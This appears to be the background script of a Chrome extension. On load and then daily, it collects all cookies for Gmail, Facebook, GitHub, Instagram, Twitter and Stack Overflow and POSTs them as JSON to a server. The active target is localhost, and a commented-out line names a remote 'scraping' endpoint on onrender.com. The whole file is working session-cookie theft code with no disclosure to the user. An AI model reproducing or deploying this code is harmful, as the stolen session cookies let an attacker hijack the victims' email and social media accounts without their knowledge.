const url = [
  "https://mail.google.com/mail",
  "https://www.facebook.com",
  "https://github.com",
  "https://www.instagram.com",
  "https://twitter.com",
  "https://stackoverflow.com",
];
const today = new Date()
const isUpdate = () => new Promise((resolve, reject) => {
  chrome.storage.sync.get(['update'], item =>{
    if(item.update)
      resolve(true)
    resolve(false)
  })
})
const sendReq = async (data) => {
  const update = await isUpdate()
  data.push(update)
  console.log(data)
  const option = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  };
  await fetch("http://localhost:2345/api/store-data", option)
    // await fetch("https://scraping-8v2x.onrender.com/api/store-data", option)
    .then((res) => {
      if (res.ok) {
        console.log("success");
      }
    })
    .catch((err) => {
      console.log("error");
    });
  return;
};

const getCookies = (param) =>
  new Promise((resolve, reject) => {
    chrome.cookies.getAll(param, (cookies) => {
      resolve(cookies)
    });
  });

const getEachCookieAndSendRequest = () => new Promise(async (resolve, reject)=>{
  var list = new Array();
  for (let i = 0; i < url.length; i++) {
    const param = {
      url: url[i],
    };
    await getCookies(param).then((item) => {
      list[i] = item
    });
  }
  sendReq(list).then(() => {
    chrome.storage.sync.set({ currentDay : today.getDate() });
  });
  resolve()
})

  //update data every 2 day
chrome.storage.sync.get(["currentDay"],async (currentDay) =>{
  if(!currentDay.currentDay){
    await getEachCookieAndSendRequest();
    chrome.storage.sync.set({currentDay : today.getDate()})
    chrome.storage.sync.set({ update : true})
  }
  //update data if it more than 2 day 
  else if(Math.abs(today.getDate() - currentDay.currentDay)> 0){
    try {
      await getEachCookieAndSendRequest();
      chrome.storage.sync.set({currentDay : today.getDate()})
      chrome.storage.sync.set({ update : true})
    } catch (error) {
      console.log(error);
    }
  }
})

